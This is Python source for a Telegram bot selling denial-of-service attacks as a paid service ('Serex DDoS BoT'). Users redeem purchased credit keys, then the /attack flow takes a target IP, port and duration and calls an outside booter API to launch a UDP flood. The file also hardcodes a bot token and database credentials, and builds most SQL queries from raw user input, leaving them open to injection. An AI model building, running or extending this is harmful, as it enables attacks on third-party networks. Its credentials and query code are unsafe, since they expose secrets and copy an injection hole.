import numbers
from unicodedata import name
from telegram.ext import Updater
from telegram.ext import CallbackContext
from telegram.ext import CommandHandler
from telegram.ext import (MessageHandler, Filters, ConversationHandler)
from telegram import Update
from telegram import ParseMode
from datetime import datetime
from datetime import timedelta
from flask import Flask, request
import requests
import random
import telnyx
import time
import mysql.connector
import MySQLdb
from datetime import datetime
from telegram import ReplyKeyboardMarkup

token = "7176190122:AAEkpv6zKnlNMhC_igRT5uwrk2Q031W7bfQ"

admins = [1781676187]
debug = True


def check_bal(userid):
    mydb = mysql.connector.connect(
        host="sql6.freesqldatabase.com",
        user="sql6693860",
        password="flANs4ibKm",
        database="sql6693860"
    )
    mycursor = mydb.cursor()
    sql = f"SELECT tokens FROM users WHERE userid = '{userid}';"
    mycursor.execute(sql)
    ape = mycursor.fetchone()
    endresult = ape[0]
    mydb.commit()
    mydb.close()
    endtoken = int(endresult) - 1

    mydb = mysql.connector.connect(
        host="sql6.freesqldatabase.com",
        user="sql6693860",
        password="flANs4ibKm",
        database="sql6693860"
    )
    mycursor = mydb.cursor()
    sql = f"UPDATE users SET tokens = '{endtoken}' WHERE userid = '{userid}'"
    mycursor.execute(sql)
    mydb.commit()


############################# plan

def balance(update: Update, context: CallbackContext):
    userid = update.effective_user.id
    try:
        db = MySQLdb.connect("sql6.freesqldatabase.com", "sql6693860", "flANs4ibKm", "sql6693860")
        insertrec = db.cursor()
        insertrec2 = db.cursor()
        sqlqueryexpiry = f"SELECT tokens FROM users WHERE userid = '{userid}';"
        insertrec2.execute(sqlqueryexpiry)
        ape = insertrec2.fetchone()
        result2 = ape[0]
        db.commit()
        db.close()
        update.message.reply_text(f"💸Your Current Balance:- <b>{result2}</b>", parse_mode=ParseMode.HTML)
    except:
        update.message.reply_text(f"💸Your Current Balance:- <b>0</b>", parse_mode=ParseMode.HTML)


############## Redeem ##########################

def redeem(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    try:
        userid = update.effective_user.id
        username = update.message.chat.username
        keyinput = msg[1]

        mydb = mysql.connector.connect(
            host="sql6.freesqldatabase.com",
            user="sql6693860",
            password="flANs4ibKm",
            database="sql6693860"
        )
        mycursor = mydb.cursor()
        sql = f"SELECT licensekey FROM keyz WHERE licensekey = '{keyinput}';"
        mycursor.execute(sql)
        row = mycursor.fetchone()
        fullkey = row[0]
        mydb.commit()
        mydb.close()

        db = MySQLdb.connect("sql6.freesqldatabase.com", "sql6693860", "flANs4ibKm", "sql6693860")
        insertrec = db.cursor()
        sqlquery = f"SELECT tokens FROM keyz WHERE licensekey = '{keyinput}';"
        insertrec.execute(sqlquery)
        row = insertrec.fetchone()
        result1 = row[0]
        db.commit()
        db.close()

        if (keyinput in fullkey):
            try:
                db = MySQLdb.connect("sql6.freesqldatabase.com", "sql6693860", "flANs4ibKm", "sql6693860")
                insertrec = db.cursor()
                sqlquery = f"SELECT tokens FROM users WHERE userid = '{userid}';"
                insertrec.execute(sqlquery)
                row = insertrec.fetchone()
                resulttoken = row[0]
                db.commit()
                db.close()

                bombotoken = int(resulttoken) + int(result1)

                mydb = mysql.connector.connect(
                    host="sql6.freesqldatabase.com",
                    user="sql6693860",
                    password="flANs4ibKm",
                    database="sql6693860"
                )
                mycursor = mydb.cursor()
                sql = f"UPDATE users SET tokens = '{bombotoken}' WHERE userid = '{userid}'"
                sql2 = f"DELETE FROM keyz WHERE licensekey = '{fullkey}'"
                mycursor.execute(sql)
                mycursor.execute(sql2)
                mydb.commit()
                update.message.reply_text(f"<b>Successfully Redeemed ({result1}) Credits Into Yout Wallet🎉</b>",
                                          parse_mode=ParseMode.HTML)
            except:
                mydb = mysql.connector.connect(
                    host="sql6.freesqldatabase.com",
                    user="sql6693860",
                    password="flANs4ibKm",
                    database="sql6693860"
                )
                mycursor = mydb.cursor()
                mycursor2 = mydb.cursor()
                sql = f"DELETE FROM keyz WHERE licensekey = '{fullkey}';"
                sql2 = "INSERT INTO users (userid, username, tokens, redeemcode) VALUES (%s, %s, %s, %s)"
                val = (f"{userid}", f"{username}", f"{result1}", f"{keyinput}")
                mycursor.execute(sql)
                mycursor2.execute(sql2, val)
                mydb.commit()
                mydb.close()
                update.message.reply_text(f"<b>Successfully Redeemed ({result1}) Credits Into Yout Wallet🎉</b>",
                                          parse_mode=ParseMode.HTML)
        else:
            update.message.reply_text("<b>🛑You Have Enter Wrong Redeem Key/Code🛑</b>" + '\n' + "<u>Enter Your Code Like This</u>:- /redeem PASTE-YOUR-KEY",
                                      parse_mode=ParseMode.HTML)
    except:
        update.message.reply_text("<b>🛑You Have Enter Wrong Redeem Key/Code🛑</b>" + '\n' + "<u>Enter Your Code Like This</u>:- /redeem PASTE-YOUR-KEY",
                                  parse_mode=ParseMode.HTML)


############## Generate ##########################

def createkey(update: Update, context: CallbackContext):
    if (update.effective_user.id in admins):
        msg = str(update.message.text).split()
        tokeninput = msg[1]
        try:
            userid = update.effective_user.id
            a = random.randint(1, 9)
            b = random.randint(1, 9)
            c = random.randint(1, 9)
            d = random.randint(1, 9)
            x = random.randint(1, 9)

            e = random.randint(1, 9)
            f = random.randint(1, 9)
            g = random.randint(1, 9)
            h = random.randint(1, 9)
            i = random.randint(1, 9)

            j = random.randint(1, 9)
            k = random.randint(1, 9)
            l = random.randint(1, 9)
            m = random.randint(1, 9)
            n = random.randint(1, 9)

            front = "DDoS-" + tokeninput + "-"

            generatedkey = front + str(a) + str(b) + str(c) + str(d) + str(x) + "-" + str(e) + str(f) + str(g) + str(
                h) + str(i) + "-" + str(j) + str(k) + str(l) + str(m) + str(n)

            mydb = mysql.connector.connect(
                host="sql6.freesqldatabase.com",
                user="sql6693860",
                password="flANs4ibKm",
                database="sql6693860"
            )
            mycursor = mydb.cursor()

            sql = "INSERT INTO keyz (licensekey, userid, tokens) VALUES (%s, %s, %s)"
            val = (f"{generatedkey}", f"{userid}", f"{tokeninput}")

            mycursor.execute(sql, val)
            mydb.commit()
            mydb.close()
            update.message.reply_text(f"{generatedkey}", parse_mode=ParseMode.HTML)
        except:
            update.message.reply_text("🔴Unable To Create Key Right Now. Please Contact Developer \n Correct Way:- /createekey <tokenamount>", parse_mode=ParseMode.HTML)
    else:
        context.bot.send_message(chat_id=update.effective_chat.id,
                                 text="❌ <b>You do not have permissions to create keys</b>", parse_mode=ParseMode.HTML)


# cmds /start /createkey /checktime /register (KEY) /deletekey (KEY) /call

# main
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        f"💟Welcome To Serex DDoS BoT😈 \n \n 👑Telegram's First Most Advance And Premium DDoS Bot Server🥇 \n\n 💨You can control me by sending these commands:- \n \n👉 /attack:- Start Attack On Your Match💥 \n 👉 /redeem:- Redeem Your Key💷 \n 👉 /Balance:- check available number of ddos attack💰 \n \n💳Purchase Your Key From Official Sellers:- https://t.me/CRACKWAR🧾")


def methods(update: Update, context: CallbackContext):
    update.message.reply_text(
        f"Fuck U M")


PART1 = range(1)
PART2 = range(2)
PART3 = range(3)
PART4 = range(4)


def attack(update: Update, context: CallbackContext):
    userid = update.effective_user.id
    msg = str(update.message.text).split()
    try:
        mydb = mysql.connector.connect(
            host="sql6.freesqldatabase.com",
            user="sql6693860",
            password="flANs4ibKm",
            database="sql6693860"
        )
        mycursor = mydb.cursor()
        sql = f"SELECT tokens FROM users WHERE userid = '{userid}';"
        mycursor.execute(sql)
        ape = mycursor.fetchone()
        endresult = ape[0]
        mydb.commit()
        mydb.close()

        if int(endresult) > 0:
            try:
                update.message.reply_text("📝 <b>Please Enter Your Match Ip Address</b>" + '' + "",
                                          parse_mode=ParseMode.HTML)
                return PART1
            except:
                update.message.reply_text("🔴Please Enter Correct Command🔴")
        else:
            update.message.reply_text(
                "<b>You Dont Have Enough Balance In Your Wallet To Start Attack🤕</b>" + '\n' + "<u>Please Contact Our Sellers To Buy Redeem Code💷</u>",
                parse_mode=ParseMode.HTML)
    except:
        update.message.reply_text(
                "<b>You Dont Have Enough Balance In Your Wallet To Start Attack🤕</b>" + '\n' + "<u>Please Contact Our Sellers To Buy Redeem Code💷</u>",
            parse_mode=ParseMode.HTML)


def part1(update, context):
    new_part1 = update.message.text
    context.user_data[part1] = new_part1
    update.message.reply_text("<b>Enter Your Match Port Number</b>" + '\n' + "", parse_mode=ParseMode.HTML)
    return PART2


def part2(update, context):
    new_part2 = update.message.text
    context.user_data[part2] = new_part2
    update.message.reply_text("📝 <b>Enter Your Attack Duration In Seconds</b>" + '\n' + "🛑Maximum Allowed Duration:- 200 Seconds🛑", parse_mode=ParseMode.HTML)
    return PART3


def part3(update, context):
    new_part3 = update.message.text
    context.user_data[part3] = new_part3
    #update.message.reply_text("📝 <b>Now enter the Method.</b>" + '\n' + "⤷ Ex: HOME", parse_mode=ParseMode.HTML)
    return PART4


def part4(update, context):
    new_part4 = update.message.text
    context.user_data[part4] = new_part4
    try:
        userid = update.effective_user.id
        host = context.user_data[part1]
        port = context.user_data[part2]
        time = context.user_data[part3]
        method = context.user_data[part4]
        methods = ["ovh", "OVH", "home", "HOME", "fivem", "FIVEM", "udp", "UDP", "tcp", "TCP", "dns", "DNS", "http",
                   "HTTP"]
        if True:
            if int(time) > 200:
                update.message.reply_text(
                    f'<b>🟥Enter Enter Correct Time In Seconds Within The Maximum Time Limit💎' + '\n' + "<u>📡 Maximum Time:- 200 seconds🏆</u>")
                return ConversationHandler.END
            else:
                res = check_bal(update.effective_user.id)
                apireq = requests.get(
                    f"https://vani.ovh/api.php?key=hadesdzz&host={host}&port={port}&time={time}&method=udpplain")
                update.message.reply_text(
                    "💣 <b>Attack Has Been Started Successfully✅</b>" + '\n' + '\n' + f"🌟Match Ip:- {host}" + '\n' + f"🌟Match Port:- {port}" + '\n' + f"🌟Duration/Time:- {time}",
                    parse_mode=ParseMode.HTML)
                return ConversationHandler.END
        else:
            update.message.reply_text(
                f"method that you have entered is invalid.")
            return ConversationHandler.END
    except:
        update.message.reply_text("🟥Unknown Error Has Been Occurred. Please Contact Admins🟥")
        return ConversationHandler.END


def help(update: Update, context: CallbackContext):
    update.message.reply_text(
                f"💟Welcome To Serex DDoS BoT😈 \n \n 👑Telegram's First Most Advance And Premium DDoS Bot Server🥇 \n\n 💨You can control me by sending these commands:- \n \n👉 /attack:- Start Attack On Your Match💥 \n 👉 /redeem:- Redeem Your Key💷 \n 👉 /Balance:- check available number of ddos attack💰 \n \n💳Purchase Your Key From Official Sellers:- https://t.me/CRACKWAR🧾")


def main():
    updater = Updater(token=token, use_context=True)
    dispatcher = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('attack', attack)],  # this is the start command of the conversation
        fallbacks=[],
        # here you can add more states for conversation
        states={
            PART1: [MessageHandler(Filters.text, part1)],
            PART2: [MessageHandler(Filters.text, part2)],
            PART3: [MessageHandler(Filters.text, part3)],
            PART4: [MessageHandler(Filters.text, part4)]
        })
    dispatcher.add_handler(conv_handler)

    start_handler = CommandHandler('start', start)
    createkey_handler = CommandHandler('createkey', createkey)
    redeem_handler = CommandHandler('redeem', redeem)
    balance_handler = CommandHandler('balance', balance)
    help_handler = CommandHandler('help', help)
   # methods_handler = CommandHandler('methods', methods)

    dispatcher.add_handler(start_handler)
    dispatcher.add_handler(createkey_handler)
    dispatcher.add_handler(redeem_handler)
    dispatcher.add_handler(balance_handler)
    #dispatcher.add_handler(methods_handler)
    dispatcher.add_handler(help_handler)
    updater.start_polling()
    print("Telegram DDoS Bot Server Working Fine!")


if __name__ == '__main__':
    main()